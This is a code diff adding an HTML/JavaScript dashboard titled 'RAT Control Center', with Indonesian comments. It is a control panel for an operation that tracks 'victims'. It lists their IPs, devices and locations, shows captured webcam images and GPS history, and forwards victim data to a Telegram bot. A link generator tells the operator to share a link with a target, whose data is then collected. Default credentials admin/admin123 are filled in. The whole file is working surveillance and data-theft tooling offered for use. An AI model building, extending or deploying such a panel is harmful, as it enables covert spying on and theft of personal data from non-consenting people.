@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎯 RAT Control Center</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0f0f1a;
+            color: #fff;
+            height: 100vh;
+        }
+
+        /* ===== LOGIN ===== */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
+        }
+        .login-box {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 380px;
+            border: 1px solid #2a2a3e;
+        }
+        .login-box .logo { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #4fc3f7; }
+        .login-box h2 { text-align: center; font-weight: 400; color: #aaa; margin-bottom: 24px; font-size: 18px; }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 13px; color: #888; margin-bottom: 4px; }
+        .input-group input {
+            width: 100%; padding: 10px 14px; background: #0a0a0f;
+            border: 1px solid #2a2a3e; border-radius: 8px; color: #fff; font-size: 14px;
+            transition: border 0.3s;
+        }
+        .input-group input:focus { outline: none; border-color: #4fc3f7; }
+        .btn-primary {
+            width: 100%; padding: 12px; background: #0d47a1; border: none;
+            border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: background 0.3s;
+        }
+        .btn-primary:hover { background: #1565c0; }
+        .error { color: #f44336; text-align: center; margin-top: 12px; font-size: 14px; }
+        .footer { margin-top: 20px; text-align: center; font-size: 13px; color: #666; }
+        .status {
+            display: inline-block; padding: 4px 12px; border-radius: 20px;
+            background: #1a1a2e; border: 1px solid #2a2a3e;
+        }
+
+        /* ===== DASHBOARD ===== */
+        .dashboard { display: flex; height: 100vh; background: #0f0f1a; }
+        .sidebar {
+            width: 220px; background: #1a1a2e; padding: 20px;
+            border-right: 1px solid #2a2a3e; display: flex; flex-direction: column;
+        }
+        .sidebar h2 { font-size: 18px; margin-bottom: 20px; color: #4fc3f7; }
+        .sidebar nav { flex: 1; }
+        .sidebar nav a {
+            display: block; padding: 10px 15px; color: #aaa;
+            text-decoration: none; border-radius: 8px; margin-bottom: 5px; cursor: pointer;
+        }
+        .sidebar nav a:hover, .sidebar nav a.active { background: #2a2a4e; color: #fff; }
+        .sidebar .logout { color: #888; text-decoration: none; padding-top: 20px; border-top: 1px solid #2a2a3e; cursor: pointer; }
+        .main { flex: 1; padding: 20px; overflow-y: auto; }
+
+        /* Stats */
+        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
+        .stat-card { background: #1a1a2e; padding: 20px; border-radius: 12px; border: 1px solid #2a2a3e; }
+        .stat-card h3 { font-size: 14px; color: #888; }
+        .stat-card .value { font-size: 28px; font-weight: 700; color: #4fc3f7; }
+        .stat-card .value.online { color: #4caf50; }
+        .stat-card .value.offline { color: #f44336; }
+
+        /* Table */
+        .victims-table { background: #1a1a2e; border-radius: 12px; padding: 20px; border: 1px solid #2a2a3e; }
+        .victims-table .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .victims-table table { width: 100%; border-collapse: collapse; }
+        .victims-table th { text-align: left; padding: 10px; color: #888; font-weight: 400; border-bottom: 1px solid #2a2a3e; }
+        .victims-table td { padding: 10px; border-bottom: 1px solid #1a1a2e; }
+        .victims-table tr:hover { background: #22223e; }
+
+        /* Buttons */
+        .btn {
+            padding: 6px 14px; border: none; border-radius: 6px;
+            cursor: pointer; font-size: 12px; margin: 2px;
+        }
+        .btn-primary { background: #0d47a1; color: #fff; }
+        .btn-danger { background: #b71c1c; color: #fff; }
+        .btn-success { background: #1b5e20; color: #fff; }
+        .btn-telegram { background: #0088cc; color: #fff; }
+
+        /* Modal */
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7); z-index: 1000;
+            justify-content: center; align-items: center;
+        }
+        .modal-content {
+            background: #1a1a2e; padding: 30px; border-radius: 16px;
+            max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto;
+        }
+        .modal-content h2 { margin-bottom: 15px; }
+        .modal-content .close {
+            float: right; background: none; border: none;
+            color: #fff; font-size: 24px; cursor: pointer;
+        }
+        .webcam-img { max-width: 100%; border-radius: 8px; }
+        .link-box { display: flex; gap: 10px; margin-top: 10px; }
+        .link-box input { flex: 1; padding: 8px 12px; background: #0a0a0f; border: 1px solid #2a2a3e; border-radius: 6px; color: #fff; }
+        .link-box button { padding: 8px 16px; background: #0d47a1; border: none; border-radius: 6px; color: #fff; cursor: pointer; }
+
+        .toast {
+            position: fixed; bottom: 20px; right: 20px;
+            background: #1b5e20; padding: 12px 24px; border-radius: 8px;
+            color: #fff; display: none; z-index: 2000;
+        }
+        .toast.error { background: #b71c1c; }
+
+        /* Hide sections */
+        .page { display: none; }
+        .page.active { display: block; }
+
+        @media (max-width: 768px) {
+            .sidebar { width: 60px; padding: 10px; }
+            .sidebar h2 { font-size: 14px; }
+            .sidebar nav a { font-size: 12px; padding: 8px; text-align: center; }
+            .sidebar nav a span { display: none; }
+            .stats { grid-template-columns: repeat(2, 1fr); }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== LOGIN PAGE ===== -->
+<div id="loginPage" class="container">
+    <div class="login-box">
+        <div class="logo">🎯 RAT Control</div>
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="username" value="admin" placeholder="Username">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" value="admin123" placeholder="Password">
+            </div>
+            <button type="submit" class="btn-primary">Login</button>
+            <p id="loginError" class="error"></p>
+        </form>
+        <div class="footer">
+            <span class="status" id="serverStatus">● Offline</span>
+        </div>
+    </div>
+</div>
+
+<!-- ===== DASHBOARD ===== -->
+<div id="dashboardPage" class="dashboard" style="display:none;">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <h2>🎯 RAT</h2>
+        <nav>
+            <a class="active" data-page="dashboard" onclick="showPage('dashboard')">📊 <span>Dashboard</span></a>
+            <a data-page="victims" onclick="showPage('victims')">👤 <span>Victims</span></a>
+            <a data-page="telegram" onclick="showPage('telegram')">📱 <span>Telegram</span></a>
+        </nav>
+        <div class="logout" onclick="logout()">← Logout</div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main">
+
+        <!-- PAGE: Dashboard -->
+        <div id="page-dashboard" class="page active">
+            <div class="stats" id="statsContainer">
+                <div class="stat-card"><h3>Total Victims</h3><div class="value" id="totalVictims">0</div></div>
+                <div class="stat-card"><h3>Online</h3><div class="value online" id="onlineVictims">0</div></div>
+                <div class="stat-card"><h3>Webcam</h3><div class="value" id="totalWebcam">0</div></div>
+                <div class="stat-card"><h3>Location</h3><div class="value" id="totalLocation">0</div></div>
+            </div>
+
+            <div class="victims-table">
+                <div class="header">
+                    <h3>Recent Victims</h3>
+                    <div>
+                        <button class="btn btn-primary" onclick="refreshVictims()">🔄 Refresh</button>
+                        <button class="btn btn-success" onclick="showLinkGenerator()">🔗 Generate Link</button>
+                        <button class="btn btn-telegram" onclick="sendAllToTelegram()">📱 Send All</button>
+                    </div>
+                </div>
+                <table>
+                    <thead><tr><th>ID</th><th>IP</th><th>Device</th><th>Location</th><th>First Seen</th><th>Actions</th></tr></thead>
+                    <tbody id="victimsBody"><tr><td colspan="6" style="text-align:center; color:#666;">Loading...</td></tr></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- PAGE: Victims -->
+        <div id="page-victims" class="page">
+            <h2>👤 All Victims</h2>
+            <div style="margin-bottom:15px;">
+                <button class="btn btn-primary" onclick="refreshVictims()">🔄 Refresh</button>
+                <button class="btn btn-telegram" onclick="sendAllToTelegram()">📱 Send All to Telegram</button>
+            </div>
+            <div class="victims-table">
+                <table>
+                    <thead><tr><th>ID</th><th>IP</th><th>Device</th><th>Location</th><th>Last Seen</th><th>Actions</th></tr></thead>
+                    <tbody id="victimsBodyAll"><tr><td colspan="6" style="text-align:center; color:#666;">Loading...</td></tr></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- PAGE: Telegram -->
+        <div id="page-telegram" class="page">
+            <h2>📱 Telegram Control</h2>
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:15px; margin-top:20px;">
+                <div class="stat-card">
+                    <h3>Bot Status</h3>
+                    <div class="value" id="botStatus" style="font-size:18px;">● Checking...</div>
+                </div>
+                <div class="stat-card">
+                    <h3>Send to Telegram</h3>
+                    <button class="btn btn-telegram" onclick="sendAllToTelegram()" style="width:100%; padding:12px; font-size:14px;">📱 Send All Victims</button>
+                </div>
+                <div class="stat-card">
+                    <h3>Manual Send</h3>
+                    <div style="display:flex; gap:8px; margin-top:8px;">
+                        <input type="text" id="manualVictimId" placeholder="Victim ID" style="flex:1; padding:8px; background:#0a0a0f; border:1px solid #2a2a3e; border-radius:6px; color:#fff;">
+                        <button class="btn btn-telegram" onclick="sendManualToTelegram()">Send</button>
+                    </div>
+                </div>
+            </div>
+            <div style="margin-top:20px; background:#1a1a2e; padding:15px; border-radius:12px; border:1px solid #2a2a3e;">
+                <h4>📋 Log Kirim ke Telegram</h4>
+                <div id="telegramLog" style="font-size:13px; color:#888; max-height:200px; overflow-y:auto; margin-top:10px;"></div>
+            </div>
+        </div>
+
+    </main>
+</div>
+
+<!-- ===== MODAL ===== -->
+<div class="modal" id="modal">
+    <div class="modal-content">
+        <button class="close" onclick="closeModal()">×</button>
+        <div id="modalBody"></div>
+    </div>
+</div>
+
+<!-- ===== TOAST ===== -->
+<div class="toast" id="toast"></div>
+
+<!-- ============================================================ -->
+<!-- ===== JAVASCRIPT ===== -->
+<script>
+// ============== KONFIGURASI ==============
+// Ganti dengan URL server API Anda
+const API_URL = 'https://your-server.com';
+// Jika lokal: const API_URL = 'http://localhost:8080';
+
+// ============== GLOBAL ==============
+let currentVictims = [];
+
+// ============== TOAST ==============
+function showToast(msg, type = 'success') {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.className = 'toast' + (type === 'error' ? ' error' : '');
+    toast.style.display = 'block';
+    clearTimeout(toast.timeout);
+    toast.timeout = setTimeout(() => { toast.style.display = 'none'; }, 3000);
+}
+
+// ============== LOGIN ==============
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    try {
+        const res = await fetch(API_URL + '/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        });
+        const data = await res.json();
+        if (data.status === 'success') {
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('dashboardPage').style.display = 'flex';
+            refreshVictims();
+            loadStats();
+            checkBotStatus();
+        } else {
+            document.getElementById('loginError').textContent = 'Login failed!';
+        }
+    } catch (err) {
+        document.getElementById('loginError').textContent = 'Server error!';
+    }
+});
+
+// ============== CHECK SERVER STATUS ==============
+async function checkServerStatus() {
+    try {
+        const res = await fetch(API_URL + '/api/stats');
+        if (res.ok) {
+            document.getElementById('serverStatus').textContent = '● Online';
+            document.getElementById('serverStatus').style.color = '#4caf50';
+        }
+    } catch {
+        document.getElementById('serverStatus').textContent = '● Offline';
+        document.getElementById('serverStatus').style.color = '#f44336';
+    }
+}
+checkServerStatus();
+setInterval(checkServerStatus, 5000);
+
+// ============== LOGOUT ==============
+function logout() {
+    document.getElementById('dashboardPage').style.display = 'none';
+    document.getElementById('loginPage').style.display = 'flex';
+}
+
+// ============== PAGE NAVIGATION ==============
+function showPage(page) {
+    document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
+    document.getElementById('page-' + page).classList.add('active');
+    document.querySelectorAll('.sidebar nav a').forEach(el => el.classList.remove('active'));
+    document.querySelector(`.sidebar nav a[data-page="${page}"]`).classList.add('active');
+    if (page === 'victims') refreshVictimsAll();
+}
+
+// ============== LOAD STATS ==============
+async function loadStats() {
+    try {
+        const res = await fetch(API_URL + '/api/stats');
+        const data = await res.json();
+        document.getElementById('totalVictims').textContent = data.victims || 0;
+        document.getElementById('onlineVictims').textContent = data.online || 0;
+        document.getElementById('totalWebcam').textContent = data.webcam_captures || 0;
+        document.getElementById('totalLocation').textContent = data.location_history || 0;
+    } catch {
+        showToast('Error loading stats', 'error');
+    }
+}
+
+// ============== REFRESH VICTIMS ==============
+async function refreshVictims() {
+    try {
+        const res = await fetch(API_URL + '/api/victims');
+        const victims = await res.json();
+        currentVictims = victims;
+        const tbody = document.getElementById('victimsBody');
+        if (victims.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#666;">No victims yet</td></tr>';
+            return;
+        }
+        tbody.innerHTML = victims.slice(0, 20).map(v => `
+            <tr>
+                <td><strong>${v.id}</strong></td>
+                <td>${v.ip || 'N/A'}</td>
+                <td>${v.device?.device || 'Unknown'}</td>
+                <td>${v.location || 'Unknown'}</td>
+                <td>${v.first_seen ? new Date(v.first_seen).toLocaleString() : 'N/A'}</td>
+                <td>
+                    <button class="btn btn-primary" onclick="viewVictim('${v.id}')">View</button>
+                    <button class="btn btn-telegram" onclick="sendToTelegram('${v.id}')">📱</button>
+                </td>
+            </tr>
+        `).join('');
+        loadStats();
+    } catch {
+        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#f44336;">Error loading data</td></tr>';
+    }
+}
+
+async function refreshVictimsAll() {
+    try {
+        const res = await fetch(API_URL + '/api/victims');
+        const victims = await res.json();
+        const tbody = document.getElementById('victimsBodyAll');
+        if (victims.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#666;">No victims yet</td></tr>';
+            return;
+        }
+        tbody.innerHTML = victims.map(v => `
+            <tr>
+                <td><strong>${v.id}</strong></td>
+                <td>${v.ip || 'N/A'}</td>
+                <td>${v.device?.device || 'Unknown'}</td>
+                <td>${v.location || 'Unknown'}</td>
+                <td>${v.last_seen ? new Date(v.last_seen).toLocaleString() : 'N/A'}</td>
+                <td>
+                    <button class="btn btn-primary" onclick="viewVictim('${v.id}')">View</button>
+                    <button class="btn btn-telegram" onclick="sendToTelegram('${v.id}')">📱</button>
+                </td>
+            </tr>
+        `).join('');
+    } catch {}
+}
+
+// ============== VIEW VICTIM ==============
+async function viewVictim(id) {
+    try {
+        const res = await fetch(API_URL + `/api/victim/${id}`);
+        const v = await res.json();
+        document.getElementById('modalBody').innerHTML = `
+            <h2>🆔 Victim: ${v.id}</h2>
+            <p><strong>IP:</strong> ${v.ip || 'N/A'}</p>
+            <p><strong>Device:</strong> ${v.device?.device || 'Unknown'}</p>
+            <p><strong>Browser:</strong> ${v.device?.browser || 'Unknown'}</p>
+            <p><strong>Platform:</strong> ${v.device?.platform || 'Unknown'}</p>
+            <p><strong>Location:</strong> ${v.location || 'Unknown'}</p>
+            <p><strong>First Seen:</strong> ${v.first_seen}</p>
+            <p><strong>Last Seen:</strong> ${v.last_seen}</p>
+            <div style="margin-top:15px; display:flex; flex-wrap:wrap; gap:8px;">
+                <button class="btn btn-telegram" onclick="sendToTelegram('${v.id}')">📱 Send to Telegram</button>
+                <button class="btn btn-primary" onclick="viewWebcam('${v.id}')">📸 Webcam</button>
+                <button class="btn btn-success" onclick="viewLocation('${v.id}')">📍 Location</button>
+            </div>
+        `;
+        document.getElementById('modal').style.display = 'flex';
+    } catch {}
+}
+
+async function viewWebcam(id) {
+    document.getElementById('modalBody').innerHTML = `
+        <h2>📸 Webcam - ${id}</h2>
+        <div style="margin-top:10px;">
+            <img src="${API_URL}/api/webcam/${id}?t=${Date.now()}" class="webcam-img"
+                 onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22400%22 height=%22300%22%3E%3Crect fill=%22%231a1a2e%22 width=%22400%22 height=%22300%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 fill=%22%23666%22 font-family=%22sans-serif%22 font-size=%2224%22%3ENo Image%3C/text%3E%3C/svg%3E'">
+            <div style="margin-top:10px; display:flex; gap:8px;">
+                <button class="btn btn-telegram" onclick="sendToTelegram('${id}')">📱 Send</button>
+                <button class="btn btn-primary" onclick="viewVictim('${id}')">← Back</button>
+            </div>
+        </div>
+    `;
+    document.getElementById('modal').style.display = 'flex';
+}
+
+async function viewLocation(id) {
+    document.getElementById('modalBody').innerHTML = `
+        <h2>📍 Location - ${id}</h2>
+        <div id="mapContainer" style="padding:10px; background:#0a0a0f; border-radius:8px; min-height:80px;">Loading...</div>
+        <div style="margin-top:10px; display:flex; gap:8px;">
+            <button class="btn btn-telegram" onclick="sendToTelegram('${id}')">📱 Send</button>
+            <button class="btn btn-primary" onclick="viewVictim('${id}')">← Back</button>
+        </div>
+    `;
+    document.getElementById('modal').style.display = 'flex';
+    
+    fetch(API_URL + `/api/location/${id}`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.length === 0) {
+                document.getElementById('mapContainer').innerHTML = 'No location data';
+                return;
+            }
+            const last = data[0];
+            document.getElementById('mapContainer').innerHTML = `
+                <p><strong>Last:</strong> ${last.lat}, ${last.lng}</p>
+                <p><strong>Accuracy:</strong> ${last.accuracy || 'N/A'}m</p>
+                <p><strong>Time:</strong> ${last.time}</p>
+                <p><a href="https://www.google.com/maps?q=${last.lat},${last.lng}" target="_blank" style="color:#4fc3f7;">Open in Google Maps →</a></p>
+                <div style="max-height:120px; overflow-y:auto; font-size:12px; color:#888; margin-top:8px;">
+                    ${data.map(d => `<div>${d.time}: ${d.lat}, ${d.lng}</div>`).join('')}
+                </div>
+            `;
+        });
+}
+
+// ============== TELEGRAM FUNCTIONS ==============
+async function sendToTelegram(victimId) {
+    try {
+        const res = await fetch(API_URL + '/api/send_to_telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ victim_id: victimId })
+        });
+        const data = await res.json();
+        if (data.status === 'success') {
+            showToast(`✅ ${victimId} sent to Telegram!`);
+            addTelegramLog(`✅ ${victimId} - ${data.message || 'Sent'}`);
+        } else {
+            showToast(`❌ Failed: ${data.message}`, 'error');
+            addTelegramLog(`❌ ${victimId} - ${data.message}`);
+        }
+    } catch {
+        showToast('❌ Error sending to Telegram', 'error');
+    }
+}
+
+async function sendAllToTelegram() {
+    if (!confirm('Kirim semua data victim ke Telegram?')) return;
+    try {
+        const res = await fetch(API_URL + '/api/send_all_to_telegram', { method: 'POST' });
+        const data = await res.json();
+        if (data.status === 'success') {
+            showToast(`✅ ${data.sent} victims sent to Telegram!`);
+            addTelegramLog(`✅ ALL - ${data.sent} victims sent`);
+        } else {
+            showToast(`❌ Failed: ${data.message}`, 'error');
+            addTelegramLog(`❌ ALL - ${data.message}`);
+        }
+    } catch {
+        showToast('❌ Error sending to Telegram', 'error');
+    }
+}
+
+async function sendManualToTelegram() {
+    const id = document.getElementById('manualVictimId').value.trim();
+    if (!id) { showToast('Masukkan Victim ID', 'error'); return; }
+    await sendToTelegram(id);
+    document.getElementById('manualVictimId').value = '';
+}
+
+async function checkBotStatus() {
+    try {
+        const res = await fetch(API_URL + '/api/bot_status');
+        const data = await res.json();
+        const el = document.getElementById('botStatus');
+        if (data.status === 'online') {
+            el.textContent = '✅ Online';
+            el.style.color = '#4caf50';
+        } else {
+            el.textContent = '❌ Offline';
+            el.style.color = '#f44336';
+        }
+    } catch {
+        document.getElementById('botStatus').textContent = '❌ Unknown';
+        document.getElementById('botStatus').style.color = '#f44336';
+    }
+}
+
+function addTelegramLog(msg) {
+    const log = document.getElementById('telegramLog');
+    log.innerHTML = `<div>${new Date().toLocaleTimeString()} - ${msg}</div>` + log.innerHTML;
+}
+
+// ============== LINK GENERATOR ==============
+function showLinkGenerator() {
+    const baseUrl = window.location.origin;
+    document.getElementById('modalBody').innerHTML = `
+        <h2>🔗 Generate Link</h2>
+        <p>Share this link to target:</p>
+        <div class="link-box">
+            <input type="text" id="linkInput" value="${baseUrl}" readonly>
+            <button onclick="copyLink()">Copy</button>
+        </div>
+        <p style="margin-top:10px; color:#888; font-size:13px;">When target opens the link, their data will be collected.</p>
+        <button class="btn btn-primary" onclick="closeModal()">Close</button>
+    `;
+    document.getElementById('modal').style.display = 'flex';
+}
+
+function copyLink() {
+    const input = document.getElementById('linkInput');
+    input.select();
+    document.execCommand('copy');
+    showToast('Link copied!');
+}
+
+// ============== MODAL ==============
+function closeModal() {
+    document.getElementById('modal').style.display = 'none';
+}
+document.getElementById('modal').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+});
+
+// ============== AUTO REFRESH ==============
+setInterval(refreshVictims, 15000);
+setInterval(loadStats, 5000);
+setInterval(checkBotStatus, 10000);
+</script>
+</body>
+</html>
